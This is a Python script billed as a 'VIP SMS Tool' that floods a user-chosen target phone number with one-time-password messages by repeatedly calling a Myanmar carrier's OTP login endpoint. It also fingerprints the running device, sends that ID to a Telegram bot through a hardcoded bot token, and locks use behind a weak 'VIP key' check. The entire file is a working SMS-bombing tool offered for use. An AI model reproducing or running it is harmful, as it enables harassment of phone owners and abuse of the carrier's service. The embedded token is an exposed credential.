#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform

BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"

def get_id():
    info = platform.processor() + platform.node() + platform.machine()
    return "DEV-" + hashlib.md5(info.encode()).hexdigest().upper()[:8]

def banner():
    os.system('clear')
    print("\033[1;32m")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print("\n    >>> ShineKoko VIP SMS Tool <<<")
    print("\033[1;37m" + "="*50)
    d_id = get_id()
    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
    print(f"[*] Model     : {platform.system()}")
    print("="*50 + "\033[0m")
    return d_id

def send_tg(d_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            # Admin ဆီကို Device ID နဲ့ ပေးရမယ့် Key ပုံစံပါ တစ်ခါတည်း ပို့ပေးခြင်း
            msg = (f"🚨 New VIP Request 🚨\n"
                   f"ID: {d_id}\n\n"
                   f"🔑 Suggested Keys:\n"
                   f"1D: SHINE-{d_id}-D1\n"
                   f"3D: SHINE-{d_id}-D3\n"
                   f"7D: SHINE-{d_id}-D7\n"
                   f"30D: SHINE-{d_id}-D30")
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def auth(d_id):
    while True:
        key = input("\n[?] Enter VIP Key: ").strip()
        if key.startswith("SHINE-") and d_id in key:
            print("\033[1;32m[+] Key Accepted!\033[0m")
            return True
        print("\033[1;31m[!] Invalid Key! Contact Admin.\033[0m")

def send_otp(p, c):
    url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
    print(f"\n[*] Sending {c} OTP to {p}...")
    for i in range(c):
        try:
            requests.get(url.format(p))
            print(f"[{i+1}/{c}] Done")
        except: pass
        time.sleep(0.05)
    print("\n[+] Process Finished!")

if __name__ == '__main__':
    try:
        d_id = banner()
        send_tg(d_id)
        if auth(d_id):
            while True: # OTP ပို့ပြီးရင် ဖုန်းနံပါတ် ပြန်ထည့်တဲ့နေရာကို ပြန်ရောက်ဖို့ Loop ပတ်ထားခြင်း
                p = input("\n[?] Enter Target Phone (or 'q' to quit): ")
                if p.lower() == 'q': break
                try:
                    c = int(input("[?] Enter Request Count: "))
                    send_otp(p, c)
                except ValueError:
                    print("[!] Invalid count.")
    except KeyboardInterrupt:
        print("\n[!] Exiting...")

